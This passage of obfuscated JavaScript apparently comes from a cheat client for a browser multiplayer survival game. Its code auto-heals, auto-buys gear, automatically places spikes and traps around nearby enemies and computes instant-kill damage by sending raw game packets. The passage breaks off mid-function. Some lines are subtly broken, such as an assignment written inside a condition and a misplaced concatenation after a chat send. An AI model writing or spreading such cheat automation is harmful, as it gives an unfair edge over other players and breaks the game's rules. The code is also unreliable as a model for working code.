      this.sid = _0x4b8fa0[1];
      this.name = _0x4b8fa0[2];
      this.x = _0x4b8fa0[3];
      this.y = _0x4b8fa0[4];
      this.dir = _0x4b8fa0[5];
      this.health = _0x4b8fa0[6];
      this.maxHealth = _0x4b8fa0[7];
      this.scale = _0x4b8fa0[8];
      this.skinColor = _0x4b8fa0[9];
    };
    this.updateTimer = function () {
      this.bullTimer -= 1;
      if (this.bullTimer <= 0) {
        this.setBullTick = false;
        this.bullTick = game.tick - 1;
        this.bullTimer = _0x213a18.serverUpdateRate;
      }
      this.poisonTimer -= 1;
      if (this.poisonTimer <= 0) {
        this.setPoisonTick = false;
        this.poisonTick = game.tick - 1;
        this.poisonTimer = _0x213a18.serverUpdateRate;
      }
    };
    this.update = function (_0x1cf9a7) {
      if (this.sid == playerSID) {
        this.circleRad = parseInt(getEl("circleRad").value) || 0;
        this.circleRadSpd = parseFloat(getEl("radSpeed").value) || 0;
        this.cAngle += this.circleRadSpd;
      }
      if (this.active) {
        let _0x4023d7 = {
          skin: findID(_0x3a9115, this.skinIndex),
          tail: findID(_0x481216, this.tailIndex)
        };
        let _0x1dead6 = (this.buildIndex >= 0 ? 0.5 : 1) * (_0x597b44.weapons[this.weaponIndex].spdMult || 1) * (_0x4023d7.skin ? _0x4023d7.skin.spdMult || 1 : 1) * (_0x4023d7.tail ? _0x4023d7.tail.spdMult || 1 : 1) * (this.y <= _0x213a18.snowBiomeTop ? _0x4023d7.skin && _0x4023d7.skin.coldM ? 1 : _0x213a18.snowSpeed : 1) * this.slowMult;
        this.maxSpeed = _0x1dead6;
      }
    };
    let _0x40a105 = 0;
    let _0x320f96 = 0;
    this.animate = function (_0x17e105) {
      if (this.animTime > 0) {
        this.animTime -= _0x17e105;
        if (this.animTime <= 0) {
          this.animTime = 0;
          this.dirPlus = 0;
          _0x40a105 = 0;
          _0x320f96 = 0;
        } else if (_0x320f96 == 0) {
          _0x40a105 += _0x17e105 / (this.animSpeed * _0x213a18.hitReturnRatio);
          this.dirPlus = _0xbcb40b.lerp(0, this.targetAngle, Math.min(1, _0x40a105));
          if (_0x40a105 >= 1) {
            _0x40a105 = 1;
            _0x320f96 = 1;
          }
        } else {
          _0x40a105 -= _0x17e105 / (this.animSpeed * (1 - _0x213a18.hitReturnRatio));
          this.dirPlus = _0xbcb40b.lerp(0, this.targetAngle, Math.max(0, _0x40a105));
        }
      }
    };
    this.startAnim = function (_0x19d9ee, _0x155107) {
      this.animTime = this.animSpeed = _0x597b44.weapons[_0x155107].speed;
      this.targetAngle = _0x19d9ee ? -_0x213a18.hitAngle : -Math.PI;
      _0x40a105 = 0;
      _0x320f96 = 0;
    };
    this.canSee = function (_0x5a734f) {
      if (!_0x5a734f) {
        return false;
      }
      let _0xa6378a = Math.abs(_0x5a734f.x - this.x) - _0x5a734f.scale;
      let _0x45c130 = Math.abs(_0x5a734f.y - this.y) - _0x5a734f.scale;
      return _0xa6378a <= _0x213a18.maxScreenWidth / 2 * 1.3 && _0x45c130 <= _0x213a18.maxScreenHeight / 2 * 1.3;
    };
    this.judgeShame = function () {
      this.lastshamecount = this.shameCount;
      if (this.oldHealth < this.health) {
        if (this.hitTime) {
          let _0xd6f304 = game.tick - this.hitTime;
          this.lastHit = game.tick;
          this.hitTime = 0;
          if (_0xd6f304 < 2) {
            this.shameCount++;
          } else {
            this.shameCount = Math.max(0, this.shameCount - 2);
          }
        }
      } else if (this.oldHealth > this.health) {
        this.hitTime = game.tick;
      }
    };
    this.addShameTimer = function () {
      this.shameCount = 0;
      this.shameTimer = 30;
      let _0x2d5dbd = setInterval(() => {
        this.shameTimer--;
        if (this.shameTimer <= 0) {
          clearInterval(_0x2d5dbd);
        }
      }, 1000);
    };
    this.isTeam = function (_0x27c49a) {
      return this == _0x27c49a || this.team && this.team == _0x27c49a.team;
    };
    this.findAllianceBySid = function (_0x4cd082) {
      if (this.team) {
        return alliancePlayers.find(_0x14fb96 => _0x14fb96 === _0x4cd082);
      } else {
        return null;
      }
    };
    this.checkCanInsta = function (_0x325894) {
      let _0x53df16 = 0;
      if (this.alive && inGame) {
        let _0x264b97 = {
          weapon: this.weapons[0],
          variant: this.primaryVariant,
          dmg: this.weapons[0] == undefined ? 0 : _0x597b44.weapons[this.weapons[0]].dmg
        };
        let _0x52f15d = {
          weapon: this.weapons[1],
          variant: this.secondaryVariant,
          dmg: this.weapons[1] == undefined ? 0 : _0x597b44.weapons[this.weapons[1]].Pdmg
        };
        let _0x3f3ddd = this.skins[7] && !_0x325894 ? 1.5 : 1;
        let _0x169a2b = _0x264b97.variant != undefined ? _0x213a18.weaponVariants[_0x264b97.variant].val : 1;
        if (_0x264b97.weapon != undefined && this.reloads[_0x264b97.weapon] == 0) {
          _0x53df16 += _0x264b97.dmg * _0x169a2b * _0x3f3ddd;
        }
        if (_0x52f15d.weapon != undefined && this.reloads[_0x52f15d.weapon] == 0) {
          _0x53df16 += _0x52f15d.dmg;
        }
        if (this.skins[53] && this.reloads[53] <= (player.weapons[1] == 10 ? 0 : game.tickRate) && near.skinIndex != 22) {
          _0x53df16 += 25;
        }
        _0x53df16 *= near.skinIndex == 6 ? 0.75 : 1;
        return _0x53df16;
      }
      return 0;
    };
    this.manageReload = function () {
      if (this.shooting[53]) {
        this.shooting[53] = 0;
        this.reloads[53] = 2500 - game.tickRate;
      } else if (this.reloads[53] > 0) {
        this.reloads[53] = Math.max(0, this.reloads[53] - game.tickRate);
      }
      if (this.reloads[this.weaponIndex] <= 1000 / 9) {
        let _0x37c565 = this.weaponIndex;
        let _0x588e39 = liztobj.filter(_0xd372d7 => (_0xd372d7.active || _0xd372d7.alive) && _0xd372d7.health < _0xd372d7.maxHealth && _0xd372d7.group !== undefined && _0xbcb40b.getDist(_0xd372d7, player, 0, 2) <= _0x597b44.weapons[player.weaponIndex].range + _0xd372d7.scale);
        for (let _0x5eaf57 = 0; _0x5eaf57 < _0x588e39.length; _0x5eaf57++) {
          let _0x596a69 = _0x588e39[_0x5eaf57];
          let _0x472283 = _0x597b44.weapons[_0x37c565].dmg * _0x213a18.weaponVariants[tmpObj[(_0x37c565 < 9 ? "prima" : "seconda") + "ryVariant"]].val * (_0x597b44.weapons[_0x37c565].sDmg || 1) * 3.3;
          let _0x80ad96 = _0x597b44.weapons[_0x37c565].dmg * _0x213a18.weaponVariants[tmpObj[(_0x37c565 < 9 ? "prima" : "seconda") + "ryVariant"]].val * (_0x597b44.weapons[_0x37c565].sDmg || 1);
          if (_0x596a69.health - _0x80ad96 <= 0 && near.length) {
            place(near.dist2 < near.scale * 1.8 + 50 ? 4 : 2, caf(_0x596a69, player) + Math.PI);
          }
        }
      }
      if (this.gathering || this.shooting[1]) {
        if (this.gathering) {
          this.gathering = 0;
          this.reloads[this.gatherIndex] = _0x597b44.weapons[this.gatherIndex].speed * (this.skinIndex == 20 ? 0.78 : 1);
          this.attacked = true;
        }
        if (this.shooting[1]) {
          this.shooting[1] = 0;
          this.reloads[this.shootIndex] = _0x597b44.weapons[this.shootIndex].speed * (this.skinIndex == 20 ? 0.78 : 1);
          this.attacked = true;
        }
      } else {
        this.attacked = false;
        if (this.buildIndex < 0) {
          if (this.reloads[this.weaponIndex] > 0) {
            this.reloads[this.weaponIndex] = Math.max(0, this.reloads[this.weaponIndex] - 110);
            if (this == player) {
              if (getEl("weaponGrind").checked) {
                for (let _0x43b3df = 0; _0x43b3df < Math.PI * 2; _0x43b3df += Math.PI / 2) {
                  checkPlace(player.getItemType(22), _0x43b3df);
                }
              }
            }
            if (this.reloads[this.primaryIndex] == 0 && this.reloads[this.weaponIndex] == 0) {
              this.antiBull++;
              game.tickBase(() => {
                this.antiBull = 0;
              }, 1);
            }
          }
        }
      }
    };
    setInterval(function () {
      if (getEl("afk").checked == true) {
        io.send("6", "|-AFK-|");
        for (let _0x99a622 = 0; _0x99a622 < Math.PI * 2; _0x99a622 += Math.PI / 2) {
          checkPlace(2, _0x99a622);
        }
      }
    }, 5000);
    this.addDamageThreat = function (_0x1316c1) {
      let _0x376c96 = {
        weapon: this.primaryIndex,
        variant: this.primaryVariant
      };
      _0x376c96.dmg = _0x376c96.weapon == undefined ? 45 : _0x597b44.weapons[_0x376c96.weapon].dmg;
      let _0x3d8e3c = {
        weapon: this.secondaryIndex,
        variant: this.secondaryVariant
      };
      _0x3d8e3c.dmg = _0x3d8e3c.weapon == undefined ? 75 : _0x597b44.weapons[_0x3d8e3c.weapon].Pdmg;
      let _0x313db2 = 1.5;
      let _0xb1ad21 = _0x376c96.variant != undefined ? _0x213a18.weaponVariants[_0x376c96.variant].val : 1.18;
      let _0x3b0a68 = _0x3d8e3c.variant != undefined ? [9, 12, 13, 15].includes(_0x3d8e3c.weapon) ? 1 : _0x213a18.weaponVariants[_0x3d8e3c.variant].val : 1.18;
      if (_0x376c96.weapon == undefined ? true : this.reloads[_0x376c96.weapon] == 0) {
        this.damageThreat += _0x376c96.dmg * _0xb1ad21 * _0x313db2;
      }
      if (_0x3d8e3c.weapon == undefined ? true : this.reloads[_0x3d8e3c.weapon] == 0) {
        this.damageThreat += _0x3d8e3c.dmg * _0x3b0a68;
      }
      if (this.reloads[53] <= game.tickRate) {
        this.damageThreat += 25;
      }
      this.damageThreat *= _0x1316c1.skinIndex == 6 ? 0.75 : 1;
      if (!this.isTeam(_0x1316c1)) {
        if (this.dist2 <= 300) {
          _0x1316c1.damageThreat += this.damageThreat;
        }
      }
    };
  }
}
;
function sendUpgrade(_0x10bc05) {
  player.reloads[_0x10bc05] = 0;
  packet("H", _0x10bc05);
}
function storeEquip(_0x215c3e, _0x27eee7) {
  packet("c", 0, _0x215c3e, _0x27eee7);
}
function storeBuy(_0x24b899, _0x187e3e) {
  packet("c", 1, _0x24b899, _0x187e3e);
}
function buyEquip(_0x532464, _0x33b5f9) {
  let _0x445794 = player.skins[6] ? 6 : 0;
  if (player.alive && inGame) {
    if (_0x33b5f9 == 0) {
      if (player.skins[_0x532464]) {
        if (player.latestSkin != _0x532464) {
          packet("c", 0, _0x532464, 0);
        }
      } else if (configs.autoBuyEquip) {
        let _0x4b2de5 = findID(hats, _0x532464);
        if (_0x4b2de5) {
          if (player.points >= _0x4b2de5.price) {
            packet("c", 1, _0x532464, 0);
            packet("c", 0, _0x532464, 0);
          } else if (player.latestSkin != _0x445794) {
            packet("c", 0, _0x445794, 0);
          }
        } else if (player.latestSkin != _0x445794) {
          packet("c", 0, _0x445794, 0);
        }
      } else if (player.latestSkin != _0x445794) {
        packet("c", 0, _0x445794, 0);
      }
    } else if (_0x33b5f9 == 1) {
      if (useWasd && _0x532464 != 11 && _0x532464 != 0) {
        if (player.latestTail != 0) {
          packet("c", 0, 0, 1);
        }
        return;
      }
      if (player.tails[_0x532464]) {
        if (player.latestTail != _0x532464) {
          packet("c", 0, _0x532464, 1);
        }
      } else if (configs.autoBuyEquip) {
        let _0x1a592e = findID(accessories, _0x532464);
        if (_0x1a592e) {
          if (player.points >= _0x1a592e.price) {
            packet("c", 1, _0x532464, 1);
            packet("c", 0, _0x532464, 1);
          } else if (player.latestTail != 0) {
            packet("c", 0, 0, 1);
          }
        } else if (player.latestTail != 0) {
          packet("c", 0, 0, 1);
        }
      } else if (player.latestTail != 0) {
        packet("c", 0, 0, 1);
      }
    }
  }
}
function selectToBuild(_0x3007c3, _0x556299) {
  packet("G", _0x3007c3, _0x556299);
}
function selectWeapon(_0x57b494, _0x843df4) {
  if (!_0x843df4) {
    player.weaponCode = _0x57b494;
  }
  packet("G", _0x57b494, 1);
}
function sendAutoGather() {
  packet("K", 1, 1);
}
function sendAtck(_0x125d63, _0x239869) {
  packet("d", _0x125d63, _0x239869, 1);
}
function place(_0x37bac2, _0x1fc27e, _0x2030ee) {
  try {
    if (_0x37bac2 == undefined) {
      return;
    }
    let _0x568cf0 = items.list[player.items[_0x37bac2]];
    let _0x175905 = player.scale + _0x568cf0.scale + (_0x568cf0.placeOffset || 0);
    let _0x247854 = player.x2 + _0x175905 * Math.cos(_0x1fc27e);
    let _0x1eca8b = player.y2 + _0x175905 * Math.sin(_0x1fc27e);
    if (player.alive && inGame && player.itemCounts[_0x568cf0.group.id] == undefined ? true : player.itemCounts[_0x568cf0.group.id] < (config.isSandbox ? 299 : _0x568cf0.group.limit ? _0x568cf0.group.limit : 99)) {
      selectToBuild(player.items[_0x37bac2]);
      sendAtck(1, _0x1fc27e);
      selectWeapon(player.weaponCode, 1);
      if (_0x2030ee && getEl("placeVis").checked) {
        placeVisible.push({
          x: _0x247854,
          y: _0x1eca8b,
          name: _0x568cf0.name,
          scale: _0x568cf0.scale,
          dir: _0x1fc27e
        });
        game.tickBase(() => {
          placeVisible.shift();
        }, 1);
      }
    }
  } catch (_0x551dbb) {}
}
function checkPlace(_0x5e1e9d, _0x52a414) {
  try {
    if (_0x5e1e9d == undefined) {
      return;
    }
    let _0x485f6f = items.list[player.items[_0x5e1e9d]];
    let _0x5b6cb6 = player.scale + _0x485f6f.scale + (_0x485f6f.placeOffset || 0);
    let _0x43b474 = player.x2 + _0x5b6cb6 * Math.cos(_0x52a414);
    let _0x31b11c = player.y2 + _0x5b6cb6 * Math.sin(_0x52a414);
    if (objectManager.checkItemLocation(_0x43b474, _0x31b11c, _0x485f6f.scale, 0.6, _0x485f6f.id, false, player)) {
      place(_0x5e1e9d, _0x52a414, 1);
    }
  } catch (_0x35c14c) {}
}
function soldierMult() {
  if (player.latestSkin == 6) {
    return 0.75;
  } else {
    return 1;
  }
}
function healthBased() {
  if (player.health == 100) {
    return 0;
  }
  if (player.skinIndex != 45 && player.skinIndex != 56) {
    return Math.ceil((100 - player.health) / items.list[player.items[0]].healing);
  }
  return 0;
}
function getAttacker(_0x3dc452) {
  let _0x38276a = enemy.filter(_0xff2e7f => {
    let _0x48c44a = {
      three: _0xff2e7f.attacked
    };
    return _0x48c44a.three;
  });
  return _0x38276a;
}
function healer(_0x4d53f9) {
  if ([0, undefined].includes(_0x4d53f9)) {
    for (let _0x4c5d86 = 0; _0x4c5d86 < healthBased(); _0x4c5d86++) {
      place(0, getAttackDir());
    }
  } else {
    for (let _0x25385c = 0; _0x25385c < healthBased() + _0x4d53f9; _0x25385c++) {
      place(0, getAttackDir());
    }
  }
}
function predictHeal(_0x32390b) {
  for (let _0x217846 in _0x32390b) {
    place(0, getAttackDir());
  }
}
function antiSyncHealing(_0x48e8b6) {
  my.antiSync = true;
  let _0x121d56 = setInterval(() => {
    if (player.shameCount < 5) {
      place(0, getAttackDir());
    }
  }, 25);
  setTimeout(() => {
    clearInterval(_0x121d56);
    setTimeout(() => {
      my.antiSync = false;
    }, game.tickRate);
  }, game.tickRate);
}
function musketSync() {
  my.autoAim = true;
  buyEquip(53, 0);
  selectWeapon(player.weapons[1]);
  setTimeout(() => {
    sendAutoGather();
    game.tickBase(() => {
      game.tickBase(() => {
        sendAutoGather();
        my.autoAim = false;
      }, 1);
    }, 1);
  }, 50);
}
const placedSpikePositions = new Set();
const placedTrapPositions = new Set();
function isPositionValid(_0x443116) {
  const _0x265d86 = player.x2;
  const _0x1693d6 = player.y2;
  const _0x8714b4 = Math.hypot(_0x443116[0] - _0x265d86, _0x443116[1] - _0x1693d6);
  return _0x8714b4 > 35;
}
function calculatePossibleTrapPositions(_0x5b8aee, _0x59f14a, _0x4a5aa5) {
  const _0x3bc699 = [];
  const _0x1ec42f = 16;
  for (let _0x3bf960 = 0; _0x3bf960 < _0x1ec42f; _0x3bf960++) {
    const _0x463d95 = Math.PI * 2 * _0x3bf960 / _0x1ec42f;
    const _0x559420 = _0x5b8aee + _0x4a5aa5 * Math.cos(_0x463d95);
    const _0x3007cc = _0x59f14a + _0x4a5aa5 * Math.sin(_0x463d95);
    const _0x5655ec = [_0x559420, _0x3007cc];
    if (!_0x3bc699.some(_0x2c8e05 => isPositionTooClose(_0x5655ec, _0x2c8e05))) {
      _0x3bc699.push(_0x5655ec);
    }
  }
  return _0x3bc699;
}
function isPositionTooClose(_0x3ed1d5, _0x513db3, _0x1d89eb = 50) {
  const _0x3c4e3a = Math.hypot(_0x3ed1d5[0] - _0x513db3[0], _0x3ed1d5[1] - _0x513db3[1]);
  return _0x3c4e3a < _0x1d89eb;
}
function biomeGear(_0x1b98e1, _0xba65f5) {
  if (player.y2 >= config.mapScale / 2 - config.riverWidth / 2 && player.y2 <= config.mapScale / 2 + config.riverWidth / 2) {
    if (_0xba65f5) {
      return 31;
    }
    buyEquip(31, 0);
  } else if (player.y2 <= config.snowBiomeTop) {
    if (_0xba65f5) {
      return 6;
    }
    buyEquip(6, 0);
  } else {
    if (_0xba65f5) {
      if (_0x1b98e1 && player.moveDir == undefined) {
        return 26;
      } else {
        return 6;
      }
    }
    buyEquip(_0x1b98e1 && player.moveDir == undefined ? 26 : 6);
  }
  if (_0xba65f5) {
    return 0;
  }
}
let advHeal = [];
class Traps {
  constructor(_0x4554af, _0x22d9c8) {
    this.dist = 0;
    this.aim = 0;
    this.inTrap = false;
    this.replaced = false;
    this.antiTrapped = false;
    this.info = {};
    this.notFast = function () {
      return player.weapons[1] == 10 && (this.info.health > _0x22d9c8.weapons[player.weapons[0]].dmg || player.weapons[0] == 5);
    };
    this.testCanPlace = function (_0x14113, _0x2cede9 = -(Math.PI / 2), _0x482623 = Math.PI / 2, _0x566da1 = Math.PI / 18, _0x572ce9, _0x1121d3, _0x587b04) {
      try {
        let _0x439b0e = _0x22d9c8.list[player.items[_0x14113]];
        let _0x42bf4a = player.scale + _0x439b0e.scale + (_0x439b0e.placeOffset || 0);
        let _0x5737a9 = {
          attempts: 0,
          placed: 0
        };
        let _0x5056f4 = [];
        liztobj.forEach(_0x25a6eb => {
          _0x5056f4.push({
            x: _0x25a6eb.x,
            y: _0x25a6eb.y,
            active: _0x25a6eb.active,
            blocker: _0x25a6eb.blocker,
            scale: _0x25a6eb.scale,
            isItem: _0x25a6eb.isItem,
            type: _0x25a6eb.type,
            colDiv: _0x25a6eb.colDiv,
            getScale: function (_0x246a48, _0xaeb0c8) {
              _0x246a48 = _0x246a48 || 1;
              return this.scale * (this.isItem || this.type == 2 || this.type == 3 || this.type == 4 ? 1 : _0x246a48 * 0.6) * (_0xaeb0c8 ? 1 : this.colDiv);
            }
          });
        });
        for (let _0x435264 = _0x2cede9; _0x435264 < _0x482623; _0x435264 += _0x566da1) {
          _0x5737a9.attempts++;
          let _0x25a4c1 = _0x572ce9 + _0x435264;
          let _0x146c5c = player.x2 + _0x42bf4a * Math.cos(_0x25a4c1);
          let _0x720b = player.y2 + _0x42bf4a * Math.sin(_0x25a4c1);
          let _0x5f4185 = _0x5056f4.find(_0x5ea1a0 => _0x5ea1a0.active && _0x4554af.getDistance(_0x146c5c, _0x720b, _0x5ea1a0.x, _0x5ea1a0.y) < _0x439b0e.scale + (_0x5ea1a0.blocker ? _0x5ea1a0.blocker : _0x5ea1a0.getScale(0.6, _0x5ea1a0.isItem)));
          if (_0x5f4185) {
            continue;
          }
          if (_0x439b0e.id != 18 && _0x720b >= config.mapScale / 2 - config.riverWidth / 2 && _0x720b <= config.mapScale / 2 + config.riverWidth / 2) {
            continue;
          }
          if (!_0x1121d3 && _0x587b04) {
            if (_0x587b04.inTrap) {
              if (_0x4554af.getAngleDist(near.aim2 + Math.PI, _0x25a4c1 + Math.PI) <= Math.PI * 1.3) {
                place(2, _0x25a4c1, 1);
              } else if (player.items[4] == 15) {
                place(4, _0x25a4c1, 1);
              }
            } else if (_0x4554af.getAngleDist(near.aim2, _0x25a4c1) <= config.gatherAngle / 2.6) {
              place(2, _0x25a4c1, 1);
            } else if (player.items[4] == 15) {
              place(4, _0x25a4c1, 1);
            }
          } else {
            place(_0x14113, _0x25a4c1, 1);
          }
          _0x5056f4.push({
            x: _0x146c5c,
            y: _0x720b,
            active: true,
            blocker: _0x439b0e.blocker,
            scale: _0x439b0e.scale,
            isItem: true,
            type: null,
            colDiv: _0x439b0e.colDiv,
            getScale: function () {
              return this.scale;
            }
          });
          if (_0x4554af.getAngleDist(near.aim2, _0x25a4c1) <= 1) {
            _0x5737a9.placed++;
          }
        }
        if (_0x5737a9.placed > 0 && _0x1121d3 && _0x439b0e.dmg) {
          if (near.dist2 <= _0x22d9c8.weapons[player.weapons[0]].range + player.scale * 1.8 && configs.spikeTick) {
            instaC.canSpikeTick = true;
          }
        }
      } catch (_0x27416b) {}
    };
    this.checkSpikeTick = function () {
      try {
        if (![3, 4, 5].includes(near.primaryIndex)) {
          return false;
        }
        if (getEl("safeAntiSpikeTick").checked || my.autoPush ? false : near.primaryIndex == undefined ? true : near.reloads[near.primaryIndex] > game.tickRate) {
          return false;
        }
        if (near.dist2 <= _0x22d9c8.weapons[near.primaryIndex || 5].range + near.scale * 1.8) {
          let _0x526057 = _0x22d9c8.list[9];
          let _0x4bce28 = near.scale + _0x526057.scale + (_0x526057.placeOffset || 0);
          let _0x4068eb = 0;
          let _0x3c365b = {
            attempts: 0,
            block: "unblocked"
          };
          for (let _0x289cac = -1; _0x289cac <= 1; _0x289cac += 1 / 10) {
            _0x3c365b.attempts++;
            let _0x465abd = _0x4554af.getDirect(player, near, 2, 2) + _0x289cac;
            let _0x11d2ad = near.x2 + _0x4bce28 * Math.cos(_0x465abd);
            let _0x3cb08a = near.y2 + _0x4bce28 * Math.sin(_0x465abd);
            let _0x46b1d3 = liztobj.find(_0x2f0c0f => _0x2f0c0f.active && _0x4554af.getDistance(_0x11d2ad, _0x3cb08a, _0x2f0c0f.x, _0x2f0c0f.y) < _0x526057.scale + (_0x2f0c0f.blocker ? _0x2f0c0f.blocker : _0x2f0c0f.getScale(0.6, _0x2f0c0f.isItem)));
            if (_0x46b1d3) {
              continue;
            }
            if (_0x3cb08a >= config.mapScale / 2 - config.riverWidth / 2 && _0x3cb08a <= config.mapScale / 2 + config.riverWidth / 2) {
              continue;
            }
            _0x4068eb++;
            _0x3c365b.block = "blocked";
            break;
          }
          if (_0x4068eb) {
            my.anti0Tick = 1;
            io.Send("6", "-AntiTick[0]-") + near.sid;
            player.chat.count = 2000;
            return true;
          }
        }
      } catch (_0x58e8d8) {
        return null;
      }
      return false;
    };
    function _0x421dae(_0x2271ed, _0x3569e0) {
      try {
        return Math.hypot((_0x3569e0.y2 || _0x3569e0.y) - (_0x2271ed.y2 || _0x2271ed.y), (_0x3569e0.x2 || _0x3569e0.x) - (_0x2271ed.x2 || _0x2271ed.x));
      } catch (_0x586d4a) {
        return Infinity;
      }
    }
    this.protect = function (_0x436a64) {
      if (!configs.antiTrap) {
        return;
      }
      if (player.items[4]) {
        this.testCanPlace(4, -(Math.PI / 2), Math.PI / 2, Math.PI / 18, _0x436a64 + Math.PI);
      } else if (near.dist2 = 80) {
        this.testCanPlace(2, -(Math.PI / 2), Math.PI / 2, Math.PI / 18, _0x436a64 + Math.PI);
        this.antiTrapped = true;
      }
    };
    this.autoPlace = function () {
      if (getEl("autoPlacetype").value == "yurpl") {
        if (game.tick % (Math.max(1, parseInt(getEl("autoPlaceTick").value)) || 1) === 0) {
          try {
            const _0x4bb88d = gameObjects.filter(_0x366079 => _0x366079.trap && _0x366079.active).sort((_0x3fbc54, _0x122f5d) => _0x4554af.getDist(_0x3fbc54, near, 0, 2) - _0x4554af.getDist(_0x122f5d, near, 0, 2)).find(_0x2eec97 => {
              const _0x474e92 = Math.hypot(_0x2eec97.y - near.y2, _0x2eec97.x - near.x2);
              return _0x2eec97 !== player && (player.sid === _0x2eec97.owner.sid || findAllianceBySid(_0x2eec97.owner.sid)) && _0x474e92 <= 50;
            });
            if (_0x4bb88d && near.dist2 <= 160) {
              const _0x506bf4 = _0x4bb88d.x;
              const _0x1a98c0 = _0x4bb88d.y;
              const _0x319c5d = 102;
              const _0x41a719 = 64;
              for (let _0x489a1b = 0; _0x489a1b < _0x41a719; _0x489a1b++) {
                const _0x51af98 = Math.PI * 2 * _0x489a1b / _0x41a719;
                const _0x38de1c = _0x506bf4 + _0x319c5d * Math.cos(_0x51af98);
                const _0x409c59 = _0x1a98c0 + _0x319c5d * Math.sin(_0x51af98);
                const _0x5c9182 = [_0x38de1c, _0x409c59];
                const _0x26b50a = Math.hypot(_0x5c9182[0] - player.x2, _0x5c9182[1] - player.y2);
                if (!placedSpikePositions.has(JSON.stringify(_0x5c9182)) && isPositionValid(_0x5c9182) && _0x26b50a <= 87) {
                  const _0x47ee97 = Math.atan2(_0x5c9182[1] - player.y2, _0x5c9182[0] - player.x2);
                  checkPlace(2, _0x47ee97);
                  placedSpikePositions.add(JSON.stringify(_0x5c9182));
                }
              }
            } else if (!_0x4bb88d && near.dist2 <= 206) {
              placedSpikePositions.clear();
              const _0x3b13bb = 3;
              const _0x80f27a = 50;
              const _0x3119c5 = calculatePossibleTrapPositions(player.x2, player.y2, _0x80f27a);
              let _0x1a2178 = 0;
              for (const _0x2fa31d of _0x3119c5) {
                if (_0x1a2178 < _0x3b13bb && !placedTrapPositions.has(JSON.stringify(_0x2fa31d)) && isPositionValid(_0x2fa31d)) {
                  checkPlace(4, ..._0x2fa31d);
                  placedTrapPositions.add(JSON.stringify(_0x2fa31d));
                  _0x1a2178++;
                }
              }
            }
          } catch (_0x316342) {
            console.log(_0x316342);
          }
        }
      } else if (getEl("autoPlacetype").value == "spammy") {
        if (enemy.length && configs.autoPlace && !instaC.ticking) {
          if (game.tick % (Math.max(1, parseInt(getEl("autoPlaceTick").value)) || 1) === 0) {
            if (liztobj.length) {
              let _0x144a99 = {
                inTrap: false
              };
              let _0x4b1da8 = liztobj.filter(_0x1c1379 => _0x1c1379.trap && _0x1c1379.active && _0x1c1379.isTeamObject(player) && _0x4554af.getDist(_0x1c1379, near, 0, 2) <= near.scale + _0x1c1379.getScale() + 5).sort(function (_0xe42138, _0x5b0829) {
                return _0x4554af.getDist(_0xe42138, near, 0, 2) - _0x4554af.getDist(_0x5b0829, near, 0, 2);
              })[0];
              if (_0x4b1da8) {
                _0x144a99.inTrap = true;
              } else {
                _0x144a99.inTrap = false;
              }
              if (near.dist3 <= 200) {
                this.testCanPlace(4, 0, Math.PI * 2, Math.PI / 24, near.aim2, 0, {
                  inTrap: _0x144a99.inTrap
                });
              } else if (player.items[4] === 15) {
                this.testCanPlace(4, 0, Math.PI * 2, Math.PI / 24, near.aim2);
              }
            } else if (near.dist3 <= 20 && player.items[4] === 15) {
              this.testCanPlace(4, 0, Math.PI * 2, Math.PI / 24, near.aim2);
            }
          }
        }
      }
    };
    function _0x5b0559(_0x2be429, _0x1d7c3e, _0x4c036, _0x33f2c4) {
      return Math.atan2(_0x33f2c4 - _0x1d7c3e, _0x4c036 - _0x2be429);
    }
    function _0x4ddbeb(_0x2af18a) {
      const _0x2ff20a = 20;
      if ((traps.inTrap || clicks.right) && _0x2af18a.health <= _0x22d9c8.weapons[player.weaponIndex].dmg && player.reloads[player.weaponIndex] == 0) {
        setTimeout(() => {
          return true;
        }, window.pingTime - window.ping / 10);
      }
      if (_0x2af18a.health <= _0x2ff20a) {
        return true;
      }
      if (near.reloads[near.weaponIndex] == 0 && near.skinIndex == 40) {
        return true;
      }
    }
    this.replacer = function (_0x101ac4) {
      if (getEl("autoReplacetype").value == "Cryv1") {
        if (!_0x101ac4 || !configs.autoReplace || !inGame || this.antiTrapped) {
          return;
        }
        if (getEl("weaponGrind").checked && _0x4554af.getDist(_0x101ac4, player, 0, 2) <= _0x22d9c8.weapons[player.weaponIndex].range + player.scale) {
          return;
        }
        let _0x4ec284 = _0x4554af.getDirect(_0x101ac4, player, 0, 2);
        let _0x32379a = _0x4554af.getDist(_0x101ac4, player, 0, 2);
        if (_0x32379a <= 400 && near.dist2 <= 400 || _0x4554af.getDist(_0x101ac4, player, 0, 2) <= 400 && near.dist2 <= 400) {
          const _0x27aada = _0x22d9c8.weapons[player.weaponIndex];
          const _0x5bf4a5 = near.primaryIndex || 5;
          const _0x4854b3 = [3, 4, 5].includes(player.weapons[0]) && near.dist2 <= _0x22d9c8.weapons[_0x5bf4a5].range + near.scale * 1.8 && player.reloads[player.weapons[0]] == 0;
          if (_0x4ddbeb(_0x101ac4) && _0x4854b3) {
            if ([3, 4, 5].includes(player.weapons[0]) && near.dist2 <= _0x22d9c8.weapons[near.primaryIndex || 5].range + near.scale * 1.8 && player.reloads[player.weapons[0]] == 0) {
              this.testCanPlace(2, 0, Math.PI * 2, Math.PI / 24, _0x4ec284, 1);
            } else if (player.items[4] == 15) {
              this.testCanPlace(4, 0, Math.PI * 2, Math.PI / 24, _0x4ec284, 1);
            }
          } else if ([3, 4, 5].includes(player.weapons[0]) && near.dist2 <= _0x22d9c8.weapons[near.primaryIndex || 5].range + near.scale * 1.8 && player.reloads[player.weapons[0]] == 0) {
            this.testCanPlace(2, 0, Math.PI * 2, Math.PI / 24, _0x4ec284, 1);
          } else if (player.items[4] == 15) {
            this.testCanPlace(4, 0, Math.PI * 2, Math.PI / 24, _0x4ec284, 1);
          }
          if (_0x4854b3) {
            this.testCanPlace(2, 0, Math.PI * 2, Math.PI / 24, _0x4ec284, 1);
          }
        }
      } else if (getEl("autoReplacetype").value == "HaThure") {
        if (!_0x101ac4 || !configs.autoReplace || !inGame || this.antiTrapped) {
          return;
        }
        let _0x1b0f8e = _0x4554af.getDirect(_0x101ac4, player, 0, 2);
        let _0x355516 = _0x4554af.getDist(_0x101ac4, player, 0, 2);
        if (getEl("weaponGrind").checked && _0x355516 <= _0x22d9c8.weapons[player.weaponIndex].range + player.scale) {
          return;
        }
        if (_0x355516 <= 400 && near.dist2 <= 400) {
          if (_0x4ddbeb(_0x101ac4)) {
            let _0x2f458c = this.checkSpikeTick();
            if (!_0x2f458c && near.dist2 <= _0x22d9c8.weapons[near.primaryIndex || 5].range + near.scale * 1.8 && player.reloads[player.weapons[0]] == 0) {
